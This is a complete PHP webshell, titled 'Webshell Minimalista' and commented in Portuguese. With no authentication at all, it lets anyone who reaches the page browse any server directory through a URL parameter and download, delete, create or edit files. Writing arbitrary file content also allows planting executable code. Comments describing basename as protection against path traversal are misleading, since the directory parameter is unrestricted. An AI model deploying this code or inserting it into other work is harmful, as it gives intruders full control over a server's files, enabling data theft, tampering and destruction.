<?php
// Configurações de exibição de erros (APENAS PARA DEPURAR! REMOVA EM PRODUÇÃO)
ini_set('display_errors', 1);
ini_set('display_startup_errors', 1);
error_reporting(E_ALL);

// Base para o caminho atual, com tratamento de realpath para segurança mínima
$current_dir = isset($_GET['dir']) ? $_GET['dir'] : getcwd();
$current_path = realpath($current_dir);

// Se o caminho for inválido ou não for um diretório, exibe erro e sai
if (!$current_path || !is_dir($current_path)) {
    die("Caminho inválido ou inacessível.");
}

// --- Funções de Ação ---

// 1. Download de Arquivo
if (isset($_GET['download']) && !empty($_GET['download'])) {
    $file_to_download = $current_path . DIRECTORY_SEPARATOR . basename($_GET['download']); // basename para evitar Path Traversal
    if (file_exists($file_to_download) && is_file($file_to_download)) {
        header('Content-Description: File Transfer');
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="' . basename($file_to_download) . '"');
        header('Expires: 0');
        header('Cache-Control: must-revalidate');
        header('Pragma: public');
        header('Content-Length: ' . filesize($file_to_download));
        readfile($file_to_download);
        exit;
    } else {
        // Pode-se redirecionar de volta com uma mensagem de erro ou morrer
        header("Location: ?dir=" . urlencode($current_path) . "&msg=" . urlencode("Arquivo para download não encontrado ou inacessível."));
        exit;
    }
}

// 2. Excluir Arquivo
if (isset($_GET['delete']) && !empty($_GET['delete'])) {
    $file_to_delete = $current_path . DIRECTORY_SEPARATOR . basename($_GET['delete']); // basename para evitar Path Traversal
    if (file_exists($file_to_delete) && is_file($file_to_delete)) {
        if (unlink($file_to_delete)) {
            header("Location: ?dir=" . urlencode($current_path) . "&msg=" . urlencode("Arquivo '" . basename($_GET['delete']) . "' excluído com sucesso."));
        } else {
            header("Location: ?dir=" . urlencode($current_path) . "&msg=" . urlencode("Erro ao excluir arquivo '" . basename($_GET['delete']) . "'."));
        }
        exit;
    } else {
        header("Location: ?dir=" . urlencode($current_path) . "&msg=" . urlencode("Arquivo para exclusão não encontrado ou inacessível."));
        exit;
    }
}

// 3. Criar Novo Arquivo
if (isset($_POST['new_file_name']) && !empty($_POST['new_file_name'])) {
    $new_file_path = $current_path . DIRECTORY_SEPARATOR . basename($_POST['new_file_name']); // basename para evitar Path Traversal
    if (file_put_contents($new_file_path, isset($_POST['content']) ? $_POST['content'] : '')) {
        header("Location: ?dir=" . urlencode($current_path) . "&msg=" . urlencode("Arquivo '" . basename($_POST['new_file_name']) . "' criado com sucesso."));
    } else {
        header("Location: ?dir=" . urlencode($current_path) . "&msg=" . urlencode("Erro ao criar arquivo '" . basename($_POST['new_file_name']) . "'."));
    }
    exit;
}

// 4. Salvar Edição de Arquivo
if (isset($_POST['edit_file_name']) && !empty($_POST['edit_file_name'])) {
    $file_to_edit_path = $current_path . DIRECTORY_SEPARATOR . basename($_POST['edit_file_name']); // basename para evitar Path Traversal
    if (file_exists($file_to_edit_path) && is_file($file_to_edit_path)) {
        if (file_put_contents($file_to_edit_path, isset($_POST['content']) ? $_POST['content'] : '')) {
            header("Location: ?dir=" . urlencode($current_path) . "&msg=" . urlencode("Arquivo '" . basename($_POST['edit_file_name']) . "' salvo com sucesso."));
        } else {
            header("Location: ?dir=" . urlencode($current_path) . "&msg=" . urlencode("Erro ao salvar arquivo '" . basename($_POST['edit_file_name']) . "'."));
        }
        exit;
    } else {
        header("Location: ?dir=" . urlencode($current_path) . "&msg=" . urlencode("Arquivo para edição não encontrado ou inacessível."));
        exit;
    }
}

?>
<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Webshell Minimalista</title>
    <style>
        body { font-family: sans-serif; background-color: #f0f0f0; color: #333; margin: 20px; }
        a { color: #007bff; text-decoration: none; }
        a:hover { text-decoration: underline; }
        table { width: 100%; border-collapse: collapse; margin-top: 20px; }
        th, td { border: 1px solid #ddd; padding: 8px; text-align: left; }
        th { background-color: #e0e0e0; }
        .path-display { background-color: #e9ecef; padding: 10px; margin-bottom: 20px; border: 1px solid #ced4da; }
        .action-form { margin-top: 20px; padding: 15px; border: 1px solid #ced4da; background-color: #fff; }
        textarea, input[type="text"], input[type="submit"], button {
            width: calc(100% - 22px); padding: 8px; margin-bottom: 10px; border: 1px solid #ced4da;
            box-sizing: border-box; /* Garante que padding e border não aumentem a largura total */
        }
        textarea { height: 200px; resize: vertical; }
        input[type="submit"], button {
            width: auto; background-color: #007bff; color: white; cursor: pointer; border: none;
            padding: 10px 15px; margin-right: 5px;
        }
        input[type="submit"]:hover, button:hover { opacity: 0.9; }
        .message { background-color: #d4edda; color: #155724; border: 1px solid #c3e6cb; padding: 10px; margin-bottom: 15px; }
        .error { background-color: #f8d7da; color: #721c24; border: 1px solid #f5c6cb; }
    </style>
</head>
<body>

    <div class="path-display">
        <strong>Caminho Atual:</strong> <?php echo htmlspecialchars($current_path); ?>
        [<a href="?dir=<?php echo urlencode(dirname($current_path)); ?>">Subir um nível</a>]
    </div>

    <?php if (isset($_GET['msg'])): ?>
        <div class="message"><?php echo htmlspecialchars($_GET['msg']); ?></div>
    <?php endif; ?>

    <?php
    // --- Interface de Edição de Arquivo ---
    if (isset($_GET['edit']) && !empty($_GET['edit'])) {
        $file_to_edit = $current_path . DIRECTORY_SEPARATOR . basename($_GET['edit']); // basename para segurança
        if (file_exists($file_to_edit) && is_file($file_to_edit)) {
            echo '<div class="action-form">';
            echo '<h3>Editar Arquivo: ' . htmlspecialchars(basename($_GET['edit'])) . '</h3>';
            echo '<form method="POST">';
            // Usar @ para suprimir warnings se o arquivo não puder ser lido (ex: permissões)
            echo '<textarea name="content">' . htmlspecialchars(@file_get_contents($file_to_edit)) . '</textarea><br>';
            echo '<input type="hidden" name="edit_file_name" value="' . htmlspecialchars(basename($_GET['edit'])) . '">';
            echo '<input type="submit" value="Salvar Edição">';
            echo '</form>';
            echo '</div>';
        } else {
            echo '<div class="action-form error"><p>Erro: Arquivo para edição não encontrado ou inacessível.</p></div>';
        }
    }
    ?>

    <table>
        <thead>
            <tr>
                <th>Nome</th>
                <th>Tipo</th>
                <th>Permissões</th>
                <th>Tamanho</th>
                <th>Última Modificação</th>
                <th>Ações</th>
            </tr>
        </thead>
        <tbody>
            <?php
            $items = scandir($current_path);
            if ($items !== false) {
                foreach ($items as $item) {
                    if ($item == '.') continue; // Ignorar o diretório atual
                    
                    $item_full_path = $current_path . DIRECTORY_SEPARATOR . $item;
                    $item_type = is_dir($item_full_path) ? 'Diretório' : 'Arquivo';
                    $item_size = '-';
                    $item_perms = '-';
                    $item_mod_time = '-';

                    if (file_exists($item_full_path)) {
                        $item_perms = substr(sprintf('%o', fileperms($item_full_path)), -4);
                        $item_mod_time = date("Y-m-d H:i:s", filemtime($item_full_path));
                        if (is_file($item_full_path)) {
                            $item_size = filesize($item_full_path) . ' bytes';
                        }
                    }

                    echo '<tr>';
                    echo '<td>';
                    if (is_dir($item_full_path)) {
                        echo '<a href="?dir=' . urlencode($item_full_path) . '">' . htmlspecialchars($item) . '/</a>';
                    } else {
                        echo '<a href="?dir=' . urlencode($current_path) . '&edit=' . urlencode($item) . '">' . htmlspecialchars($item) . '</a>';
                    }
                    echo '</td>';
                    echo '<td>' . htmlspecialchars($item_type) . '</td>';
                    echo '<td>' . htmlspecialchars($item_perms) . '</td>';
                    echo '<td>' . htmlspecialchars($item_size) . '</td>';
                    echo '<td>' . htmlspecialchars($item_mod_time) . '</td>';
                    echo '<td>';
                    if (is_file($item_full_path)) {
                        echo '<a href="?dir=' . urlencode($current_path) . '&download=' . urlencode($item) . '">Download</a> | ';
                    }
                    echo '<a href="?dir=' . urlencode($current_path) . '&delete=' . urlencode($item) . '" onclick="return confirm(\'Tem certeza que deseja apagar ' . htmlspecialchars($item) . '?\');">Apagar</a>';
                    echo '</td>';
                    echo '</tr>';
                }
            } else {
                echo '<tr><td colspan="6">Não foi possível ler o conteúdo do diretório. Verifique as permissões.</td></tr>';
            }
            ?>
        </tbody>
    </table>

    <div class="action-form">
        <h3>Criar Novo Arquivo</h3>
        <form method="POST">
            <input type="text" name="new_file_name" placeholder="Nome do novo arquivo" required><br>
            <textarea name="content" placeholder="Conteúdo do arquivo (opcional)"></textarea><br>
            <input type="submit" value="Criar Arquivo">
        </form>
    </div>

</body>
</html>
